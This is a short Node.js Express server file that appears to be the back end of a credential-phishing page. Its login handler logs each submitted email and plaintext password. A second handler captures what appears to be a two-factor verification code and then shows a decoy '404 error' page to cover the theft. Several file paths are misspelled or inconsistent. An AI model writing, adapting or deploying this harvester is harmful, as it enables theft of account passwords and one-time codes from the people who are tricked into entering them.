const express = require('express');
const bodyParser = require('body-parser');
const PORT = 3000;
const app = express();


app.use(bodyParser.urlencoded({extended: false}));
app.use(express.static('vews'));

app.get('/',(req,res)=>{
  res.sendFile(__dirname + '/Group/indax.html');
});

app.get('/login',(req,res)=>{
  res.sendFile(__dirname + '/ews/login.html');
  
});
app.get('/code',(req,res)=>{
  res.sendFile(__dirname + '/vews/code.html');
  
});
app.post('/login',(req,res)=>{
  const email = req.body.email;
  const password = req.body.password;
  console.log(`email : ${email}`);
  console.log(`password : ${password}`);
 res.redirect('/code');

});
app.post('/code',(req,res)=>{
  const code = req.body.code;
  console.log(`code : ${code}`)
  res.send('<h1>404 error')
});


app.listen(PORT,()=>{
  console.log(`server is running http://localhost:${PORT}`);
});
